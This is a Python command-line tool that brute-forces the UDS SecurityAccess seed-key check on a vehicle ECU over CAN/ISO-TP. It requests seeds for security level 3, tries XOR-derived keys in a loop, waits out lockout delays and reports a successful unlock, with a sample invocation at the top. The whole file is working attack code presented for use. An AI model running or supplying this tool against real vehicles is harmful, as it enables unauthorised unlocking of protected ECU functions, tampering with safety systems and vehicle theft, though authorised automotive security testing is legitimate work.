#sample python3 uds_secaccess_xor_bruteforce2.py --channel can0 --req-id 0x7E1 --resp-id 0x7E9 --key-len 4 --attempts 500 --per-seed-attempts 200
#!/usr/bin/env python3
import argparse, random, time, sys
from dataclasses import dataclass
import can, isotp

NR = 0x7F
SID_REQ, SID_POS = 0x27, 0x67
NRC = {0x36:"Required Time Delay Not Expired",0x35:"Invalid Key"}

def hexd(b: bytes) -> str: return b.hex()
def uN(b: bytes) -> int:
    v=0
    for x in b: v=(v<<8)|x
    return v
def be(v:int,n:int)->bytes: return v.to_bytes(n,"big")

@dataclass
class BruteConfig:
    seed_sf:int; key_sf:int; key_len:int
    attempts:int; per_seed_attempts:int; randomize:bool
    sleep36:float; rate:float

class SecAccessXORBF:
    def __init__(self, channel, bitrate, req_id, resp_id, cfg, iface="socketcan"):
        self.bus = can.Bus(interface=iface, channel=channel, bitrate=bitrate)
        addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=req_id, rxid=resp_id)
        self.stack = isotp.CanStack(self.bus, address=addr, params={"stmin":0, "blocksize":8, "tx_padding":0x00})
        self.cfg = cfg

    def close(self):
        try: self.bus.shutdown()
        except Exception: pass

    def _xfer(self, payload: bytes, timeout=3.0):
        self.stack.send(payload)
        end = time.time()+timeout
        while time.time()<end:
            self.stack.process()
            if self.stack.available(): return self.stack.recv()
            time.sleep(0.001)
        return None

    def seed(self):
        return self._xfer(bytes([SID_REQ, self.cfg.seed_sf]), timeout=3.0)

    def key(self, key_bytes: bytes):
        return self._xfer(bytes([SID_REQ, self.cfg.key_sf]) + key_bytes, timeout=3.0)

    def run(self):
        attempts = 0; global_try = 0
        try:
            while attempts < self.cfg.attempts:
                attempts += 1
                print(f"\n--- Bruteforce Attempt {attempts} ---")
                print("Accessing security level 3...")
                r = self.seed()
                if not r: print("No response to seed request."); continue
                if r[0]==NR:
                    code = r[2] if len(r)>=3 else 0
                    print(f"Negative response to seed request: NRC=0x{code:02X}")
                    if code==0x36: time.sleep(self.cfg.sleep36)
                    continue
                if r[0]!=SID_POS or r[1]!=self.cfg.seed_sf or len(r)<3:
                    print(f"Unexpected seed response: {hexd(r)}"); continue

                seed = r[2:]
                if len(seed)!=self.cfg.key_len:
                    print(f"Seed len {len(seed)} != expected {self.cfg.key_len}; adjusting.")
                    self.cfg.key_len = len(seed)
                seed_int = uN(seed)
                print(f"Seed received: {seed_int:08x}")

                for _ in range(self.cfg.per_seed_attempts):
                    global_try += 1
                    secret = random.getrandbits(self.cfg.key_len*8) if self.cfg.randomize else (global_try & ((1<<(self.cfg.key_len*8))-1))
                    key_int = seed_int ^ secret
                    key_b = be(key_int, self.cfg.key_len)
                    print(f"Trying new XOR key: 0x{secret:0{self.cfg.key_len*2}X}: {key_int:0{self.cfg.key_len*2}X}")
                    print("Unlocking access...")
                    ur = self.key(key_b)
                    if not ur: print("Unlock response: (no reply)"); continue

                    if ur[0]==NR and len(ur)>=3 and ur[1]==SID_REQ:
                        code = ur[2]
                        print(f"Unlock response: 037f{ur[1]:02x}{code:02x}ffffffff")
                        if code==0x36: time.sleep(self.cfg.sleep36)
                        if self.cfg.rate>0: time.sleep(self.cfg.rate)
                        continue

                    if ur[0]==SID_POS and ur[1]==self.cfg.key_sf:
                        echoed = ur[2:]
                        print(f"Unlock response: {hexd(echoed) or 'success'}")
                        print(f"SUCCESS!! Unlock successful with XOR key: 0x{secret:0{self.cfg.key_len*2}X}")
                        print(f"Final key used: {key_int:0{self.cfg.key_len*2}X}")
                        print(f"Full response: {hexd(ur)}")
                        return 0

                    print(f"Unlock response (unexpected): {hexd(ur)}")
                    if self.cfg.rate>0: time.sleep(self.cfg.rate)

            print("\nBruteforce finished without success."); return 1
        finally:
            self.close()

def main():
    ap=argparse.ArgumentParser(description="UDS SecurityAccess XOR brute-forcer over CAN/ISO-TP")
    ap.add_argument("--iface", default="socketcan"); ap.add_argument("--channel", default="can0")
    ap.add_argument("--bitrate", type=int, default=500000)
    ap.add_argument("--req-id", type=lambda x:int(x,0), default=0x7E0)
    ap.add_argument("--resp-id", type=lambda x:int(x,0), default=0x7E8)
    ap.add_argument("--seed-sf", type=lambda x:int(x,0), default=0x03)
    ap.add_argument("--key-sf",  type=lambda x:int(x,0), default=0x04)
    ap.add_argument("--key-len", type=int, default=4)
    ap.add_argument("--attempts", type=int, default=1_000_000)
    ap.add_argument("--per-seed-attempts", type=int, default=1000)
    ap.add_argument("--randomize", action="store_true")
    ap.add_argument("--sleep-nr36", type=float, default=0.5)
    ap.add_argument("--rate", type=float, default=0.0)
    a=ap.parse_args()
    cfg=BruteConfig(a.seed_sf,a.key_sf,a.key_len,a.attempts,a.per_seed_attempts,a.randomize,a.sleep_nr36,a.rate)
    try:
        sys.exit(SecAccessXORBF(a.channel,a.bitrate,a.req_id,a.resp_id,cfg,a.iface).run())
    except KeyboardInterrupt:
        print("\nInterrupted by user."); sys.exit(130)

if __name__=="__main__": main()
